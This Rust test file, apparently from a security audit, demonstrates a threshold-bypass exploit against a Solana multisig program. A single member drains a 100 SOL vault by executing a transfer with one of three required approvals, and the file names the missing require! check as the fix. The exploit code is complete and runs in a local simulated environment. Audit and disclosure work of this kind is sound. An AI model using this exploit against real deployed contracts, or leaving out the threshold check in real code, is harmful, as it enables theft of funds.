// Exploit: Threshold Bypass (Missing Threshold Check in Execution)
//
// Vulnerability: V002 - The execute_transfer_proposal instruction does not validate
// that approval_count >= threshold before executing transfers.
//
// Attack: Member creates a proposal and immediately executes it without waiting
// for sufficient approvals, draining the vault.
//
// Result: Complete circumvention of multi-signature security - single member can
// steal all funds despite threshold requirement.

mod utils;

use utils::*;

use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_threshold_bypass() {
    println!("\n=== EXPLOIT TEST: Threshold Bypass (V002) ===\n");
    println!("[Scenario] Attacker executes proposal with insufficient approvals");

    let mut scenario = setup_multisig_scenario(3, 0); // threshold = 3, timelock = 0

    println!("[Setup] Creating multisig with threshold = 3...");

    // Create multisig with 3 members, threshold = 3
    let owners = vec![
        (scenario.creator.pubkey(), MemberRole::Admin),
        (scenario.member1.pubkey(), MemberRole::Proposer),
        (scenario.member2.pubkey(), MemberRole::Executor),
        (scenario.member3.pubkey(), MemberRole::Executor),
    ];

    create_multisig_with_owners(
        &mut scenario.svm,
        &scenario.creator,
        &scenario.multisig_pda,
        &scenario.vault_pda,
        scenario.multisig_id,
        3, // threshold
        0, // timelock
        &owners,
    );

    println!("[Setup] Multisig created with 4 members, threshold = 3");

    // Fund the vault with 100 SOL
    println!("[Setup] Funding vault with 100 SOL...");
    fund_vault(
        &mut scenario.svm,
        &scenario.vault_pda,
        100 * LAMPORTS_PER_SOL,
    );

    let vault_balance = scenario.svm.get_account(&scenario.vault_pda)
        .expect("Vault should exist")
        .lamports;
    println!("[Setup] Vault balance: {} SOL", vault_balance / LAMPORTS_PER_SOL);

    // Attacker (member1 with Proposer role) creates transfer proposal
    println!("\n[Attack] Member1 creates transfer proposal to steal 100 SOL...");

    // Get current proposal_count to derive correct PDA
    let proposal_count = get_multisig_proposal_count(&scenario.svm, &scenario.multisig_pda);
    let (transfer_proposal_pda, _) =
        derive_transfer_proposal_pda(&scenario.multisig_pda, proposal_count);

    let create_transfer_ix = build_create_transfer_proposal_ix(
        &scenario.member1.pubkey(),
        &scenario.multisig_pda,
        &transfer_proposal_pda,
        100 * LAMPORTS_PER_SOL,
        &scenario.attacker.pubkey(),
    );

    send_tx_expect_success(
        &mut scenario.svm,
        create_transfer_ix,
        &scenario.member1,
        &[&scenario.member1],
    );

    println!("[Attack] Transfer proposal created (auto-approved by proposer)");
    println!("[Attack] Approval count: 1/3 (INSUFFICIENT)");

    // Record attacker's balance before exploit
    let attacker_balance_before = scenario.svm.get_account(&scenario.attacker.pubkey())
        .expect("Attacker account should exist")
        .lamports;
    println!("[Setup] Attacker balance before: {} SOL", attacker_balance_before / LAMPORTS_PER_SOL);

    // EXPLOIT: Member2 (Executor) immediately executes without sufficient approvals
    println!("\n[Attack] Member2 (Executor) executes with only 1/3 approvals...");

    let execute_ix_data = build_execute_transfer_proposal_data();

    let execute_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member2.pubkey(), true), // executor
            AccountMeta::new(scenario.multisig_pda, false),    // multisig_account
            AccountMeta::new(transfer_proposal_pda, false),    // transfer_proposal
            AccountMeta::new(scenario.vault_pda, false),       // vault
            AccountMeta::new(scenario.attacker.pubkey(), false), // recipient
            AccountMeta::new_readonly(solana_system_interface::program::ID, false), // system_program
        ],
        data: execute_ix_data,
    };

    let execute_tx = Transaction::new_signed_with_payer(
        &[execute_ix],
        Some(&scenario.member2.pubkey()),
        &[&scenario.member2],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(execute_tx);

    match result {
        Ok(metadata) => {
            println!("[VULNERABLE] Execution succeeded with ONLY 1/3 approvals!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);

            let attacker_balance_after = scenario.svm.get_account(&scenario.attacker.pubkey())
                .expect("Attacker account should exist")
                .lamports;

            let vault_balance_after = scenario.svm.get_account(&scenario.vault_pda)
                .map(|acc| acc.lamports)
                .unwrap_or(0);

            println!("[EXPLOIT SUCCESS] Attacker balance after: {} SOL",
                attacker_balance_after / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Vault balance after: {} SOL",
                vault_balance_after / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Stolen amount: {} SOL",
                (attacker_balance_after - attacker_balance_before) / LAMPORTS_PER_SOL);

            println!("\n[Analysis] The vulnerable code is missing this check:");
            println!("           require!(approval_count >= threshold, MultisigError::InsufficientApprovals);");
        }
        Err(e) => {
            println!("[Result] Execution failed: {:?}", e);
            println!("[Analysis] Expected to succeed due to missing threshold check");

            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
        }
    }

    println!("\n=== END: Threshold Bypass Exploit ===\n");
}
